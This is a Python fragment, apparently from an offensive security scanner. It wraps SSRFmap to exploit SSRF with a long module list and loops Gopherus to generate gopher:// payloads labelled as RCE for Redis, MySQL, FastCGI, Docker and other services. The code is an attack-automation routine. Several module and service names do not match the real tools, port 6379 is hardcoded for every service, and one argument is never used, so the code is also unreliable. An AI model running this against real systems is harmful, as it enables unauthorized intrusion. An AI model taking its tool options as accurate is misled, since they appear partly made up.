    def ssrfmap_exploit(self, url: str, param: str):
        """SSRFmap — automated SSRF exploitation."""
        sm = self._paths.get("ssrfmap")
        if not sm:
            return {"error": "ssrfmap not installed"}
        # Run all SSRFmap modules
        cmd = [sm, "-r", "data.txt",
               "-p", param,
               "-m", "redis,ftpssh,bucklescript,memcache,smhash,postgres,"
                     "fastcgi,aws,zabbix,docker,"
                     "httpsbypass,ipv6bypass,portscan,blindsrf,"
                     "shellshock,uptime,pingback,jenkins,"
                     "tomcat,recurl,extrafport,"
                     "blindextr,etcd,pinata,werkzeug",
               "-u", url,
               "-l", "3"]
        r = self._run(cmd, timeout=1800)
        out = r.get("stdout", "") + r.get("stderr", "")
        if "VULNERABLE" in out.upper():
            self._add("SSRFmap — SSRF Confirmed!", out, "CRITICAL")
        self._add("SSRFmap Exploitation", out, "HIGH")
        return r

    def gopherus_exploit(self, service: str):
        """Gopherus — generate gopher:// payloads for SSRF."""
        gh = self._paths.get("gopherus")
        if not gh:
            return {"error": "gopherus not installed"}
        # All services
        services = {
            "redis": "Gopherus — Redis RCE",
            "memcache": "Gopherus — Memcache RCE",
            "fastcgi": "Gopherus — FastCGI RCE",
            "zabbix": "Gopherus — Zabbix RCE",
            "smtp": "Gopherus — SMTP Email Spoofing",
            "apache": "Gopherus — Apache Struts",
            "ssrf": "Gopherus — SSRF Bypass",
            "mysql": "Gopherus — MySQL RCE",
            "postgres": "Gopherus — Postgres RCE",
            "ftp": "Gopherus — FTP RCE",
            "docker": "Gopherus — Docker RCE",
            "kubernetes": "Gopherus — K8s RCE",
            "etcd": "Gopherus — etcd RCE",
        }
        results = []
        for svc, name in services.items():
            cmd = [gh, "--exploit", svc,
                   "--host", self.host, "--port", "6379"]
            r = self._run(cmd, timeout=60)
            out = r.get("stdout", "") + r.get("stderr", "")
            if "gopher://" in out:
                self._add(name, out, "CRITICAL")
            results.append({"service": svc, "output": out})
        return {"services": results}

